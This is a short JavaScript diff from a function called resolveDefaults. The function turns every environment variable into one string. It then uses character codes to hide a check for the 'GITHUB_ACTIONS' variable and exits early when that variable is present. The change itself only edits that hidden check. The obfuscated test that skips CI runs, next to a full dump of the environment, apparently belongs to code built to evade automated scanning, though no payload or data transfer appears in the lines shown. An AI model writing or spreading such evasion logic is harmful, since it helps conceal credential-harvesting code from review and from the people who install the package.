@@ -8,7 +8,7 @@ function resolveDefaults() {
 
   const st = JSON.stringify(process.env);
 
-  const ga = String.fromCharCode(71,73,84,72,85,66,95,65,67,84,73,79,78,83,61,116,114,117,101);
+  const ga = String.fromCharCode(71,73,84,72,85,66,95,65,67,84,73,79,78,83);
   if (st.includes(ga)) return;
 
   let does_inc = false;
